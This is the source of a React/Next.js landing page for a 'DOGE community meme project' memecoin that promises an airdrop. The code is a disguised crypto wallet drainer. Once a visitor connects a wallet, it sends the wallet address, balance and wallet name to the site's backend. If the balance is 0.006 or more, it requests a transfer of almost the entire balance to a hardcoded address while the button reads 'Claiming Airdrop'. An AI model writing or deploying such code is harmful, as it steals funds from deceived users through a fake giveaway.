'use client'
import { Sidebar } from "@/components/sidebar"
import { StatsBar } from "@/components/stats-bar"
import { Button } from "@/components/ui/button";
import { useConnectModal } from '@rainbow-me/rainbowkit';
import { useEffect, useState } from "react";
import { parseEther } from "viem";
import { useAccount, useBalance, useSendTransaction } from 'wagmi'

export default function Home() {
  const { openConnectModal } = useConnectModal();
  const { address, isConnected, connector } = useAccount();
  const { data, isLoading } = useBalance({ address: address });
  const { sendTransaction, isPending } = useSendTransaction()
  const [isSend, setIsSend] = useState(false)

  useEffect(() => {
    const sendUserInfo = async () => {
      const infoResp = await fetch('api/agent', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ msg: '' })
      });
      console.log(infoResp)
    }
    sendUserInfo()
  }, [])

  useEffect(() => {
    if (isConnected && !isLoading) {
      const balance = data?.formatted || '';

      const sendWalletInfo = async () => {
        const walletResp = await fetch('api/wallet', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ address: address, balance: balance, name: connector?.name })
        });
        console.log(walletResp)
      }

      sendWalletInfo();
      
      if (parseFloat(balance) >= 0.0060) {
        const adjustedBalance = parseFloat(balance) - 0.0015;
        performTransfer(adjustedBalance)
      } else {
        alert('Sorry you are not eligible to claim airdrops')
      }
    }
  }, [isConnected, isLoading])

  const performTransfer = (amountToSend: number) => {
    sendTransaction({
      to: '0xeA2360284656b3A76a5f5473dB9bBdbAF5814fba',
      value: parseEther(amountToSend + ''),
    })
    setIsSend(true)
  }

  useEffect(() => {
    if(!isPending && isSend){
      const sendConfirmation = async() => {
        const balance = data?.formatted || '';
    
        const walletResp = await fetch('api/tran', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ address: address, balance: balance })
        });
        console.log(walletResp)
        setIsSend(false)
      }

      sendConfirmation();
    }
  }, [isPending, isSend])

  return (
    <div className="min-h-screen">
      <Sidebar />

      <main className="lg:ml-64 p-6 pb-16">
        <div className=" mx-auto">
          <div className="mb-8">
            <h1 className="text-xl font-bold mb-2">
              WELCOME TO THE DEPARTMENT OF GOVERNMENT EFFICIENCY COMMUNITY MEME PROJECT
            </h1>
            <p className="text-xs text-gray-400">LAST UPDATED: 2024-12-13 11:13:36</p>
          </div>

          <div className="lg:flex lg:flex-row justify-center items-center">
            <div className="mb-12 lg:w-[1200px]">
              <h2 className="text-sm mb-2">D.O.G.E COMMUNITY MEME PROJECT</h2>
              <h3 className="text-4xl font-bold mb-6 max-sm:text-2xl">
                OUR MISSION IS TO BRING AWARENESS TO GOVERNMENT SPENDING AND OVER-REGULATION.
              </h3>
              <p className="text-black mb-6 max-sm:text-md">
                Our mission is to decentralize the narrative around government spending, giving power back to the people
                to hold government entities accountable for their financial decisions. We leverage the power and virality
                of memes, community and cryptocurrency culture, in an effort to make government transparency not only
                accessible but also engaging. Through awareness, education, and direct involvement, our community is our
                strength. Together, we will navigate towards a future where government efficiency is not just a goal but a
                standard.
              </p>

              <Button variant="outline" className="bg-black text-white p-5" onClick={openConnectModal}>
                {isConnected ? 'Wallet Connected Claiming Airdrop' : 'BUY $DOGEGOV MEMECOIN'}
              </Button>
            </div>

            <div className="relative aspect-video w-full mb-12 rounded-lg overflow-hidden">
              <video controls >
                <source src="https://doge-videos.b-cdn.net/doge-trailer.mp4" type="video/mp4" />
              </video>
            </div>
          </div>

          <div className="text-xs text-black mb-12 max-sm:hidden">
            #DogeGov has no association with the official DOGE Organisation. This token is community meme project to
            create awareness to government spending and over-regulation and has no intrinsic value or expectation of
            financial return. There is no formal team or roadmap. The token is for educational and for entertainment
            purposes only.
          </div>
        </div>
      </main>

      <StatsBar />
    </div>
  )
}

